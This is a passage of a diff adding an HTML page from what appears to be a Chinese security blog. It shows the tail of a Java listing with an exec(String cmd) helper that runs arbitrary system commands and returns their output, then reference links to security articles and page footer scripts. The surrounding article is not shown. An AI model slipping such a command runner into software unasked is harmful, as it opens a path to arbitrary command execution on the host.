class="gutter"><pre><span class="line">7</span></pre></td><td class="code"><pre><span class="line"></span></pre></td></tr><tr><td class="gutter"><pre><span class="line">8</span></pre></td><td class="code"><pre><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">exec</span><span class="params">(String cmd)</span> </span>&#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">9</span></pre></td><td class="code"><pre><span class="line">        <span class="keyword">try</span> &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">10</span></pre></td><td class="code"><pre><span class="line">            String sb = <span class="string">""</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">11</span></pre></td><td class="code"><pre><span class="line">            BufferedInputStream in = <span class="keyword">new</span> BufferedInputStream(Runtime.getRuntime().exec(cmd).getInputStream());</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">12</span></pre></td><td class="code"><pre><span class="line">            BufferedReader inBr = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">13</span></pre></td><td class="code"><pre><span class="line">            String lineStr;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">14</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">while</span> ((lineStr = inBr.readLine()) != <span class="keyword">null</span>)</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">15</span></pre></td><td class="code"><pre><span class="line">                sb += lineStr + <span class="string">"\n"</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">16</span></pre></td><td class="code"><pre><span class="line">            inBr.close();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">17</span></pre></td><td class="code"><pre><span class="line">            in.close();</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">18</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">return</span> sb;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">19</span></pre></td><td class="code"><pre><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">20</span></pre></td><td class="code"><pre><span class="line">            <span class="keyword">return</span> <span class="string">""</span>;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">21</span></pre></td><td class="code"><pre><span class="line">        &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">22</span></pre></td><td class="code"><pre><span class="line">    &#125;</span></pre></td></tr><tr><td class="gutter"><pre><span class="line">23</span></pre></td><td class="code"><pre><span class="line">&#125;</span></pre></td></tr></table></figure>
+
+<p><strong>参考：</strong></p>
+<p><a href="https://www.anquanke.com/post/id/194384#h3-2" target="_blank" rel="noopener">https://www.anquanke.com/post/id/194384#h3-2</a></p>
+<p><a href="https://www.jianshu.com/p/5c6f2b6d458a" target="_blank" rel="noopener">https://www.jianshu.com/p/5c6f2b6d458a</a></p>
+<p><a href="https://www.freebuf.com/column/189835.html" target="_blank" rel="noopener">https://www.freebuf.com/column/189835.html</a></p>
+
+        
+            <div class="donate-container">
+    <div class="donate-button">
+        <button id="donate-button">赞赏</button>
+    </div>
+    <div class="donate-img-container hide" id="donate-img-container">
+        <img id="donate-img" src="" data-src="/img/donate.jpg">
+        <p> 感谢鼓励 </p>
+    </div>
+</div>
+        
+        <br />
+        <div id="comment-container">
+        </div>
+        <div id="disqus_thread"></div>
+
+        <div id="lv-container">
+        </div>
+
+    </div>
+</div>
+
+    </div>
+</div>
+
+
+<footer class="footer">
+    <ul class="list-inline text-center">
+        
+        
+
+        
+
+        
+
+        
+
+        
+
+    </ul>
+    
+    <p>
+        <span>/</span>
+        
+        <span><a href="https://github.com/he1m4n6a" target="_blank" rel="noopener">github</a></span>
+        <span>/</span>
+        
+        <span><a href="https://weibo.com/u/1736968374" target="_blank" rel="noopener">weibo</a></span>
+        <span>/</span>
+        
+        <span><a href="#">wechat</a></span>
+        <span>/</span>
+        
+    </p>
+    
+    <p>
+        <span id="busuanzi_container_site_pv">
+            <span id="busuanzi_value_site_pv"></span>PV
+        </span>
+        <span id="busuanzi_container_site_uv">
+            <span id="busuanzi_value_site_uv"></span>UV
+        </span>
+        Created By <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>  Theme <a href="https://github.com/aircloud/hexo-theme-aircloud" target="_blank" rel="noopener">AirCloud</a></p>
+</footer>
+
+
+
+
+</body>
+
+<script>
+    // We expose some of the variables needed by the front end
+    window.hexo_search_path = "search.json"
+    window.hexo_root = "/"
+    window.isPost = true
+</script>
+<script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+<script src="/js/index.js"></script>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+    <script>
+        /**
+         *  RECOMMENDED CONFIGURATION VARIABLES: EDIT AND UNCOMMENT THE SECTION BELOW TO INSERT DYNAMIC VALUES FROM YOUR PLATFORM OR CMS.
+         *  LEARN WHY DEFINING THESE VARIABLES IS IMPORTANT: https://disqus.com/admin/universalcode/#configuration-variables
+        */
+        if( '' || '')
+        var disqus_config = function () {
+            this.page.url = '';  // Replace PAGE_URL with your page's canonical URL variable
+            this.page.identifier = ''; // Replace PAGE_IDENTIFIER with your page's unique identifier variable
+        };
+
+        (function() { // DON'T EDIT BELOW THIS LINE
+            var d = document, s = d.createElement('script');
+            s.src = 'https://airclouds-blog.disqus.com/embed.js';
+            s.setAttribute('data-timestamp', +new Date());
+            (d.head || d.body).appendChild(s);
+        })();
+    </script>
+
+
+
+</html>
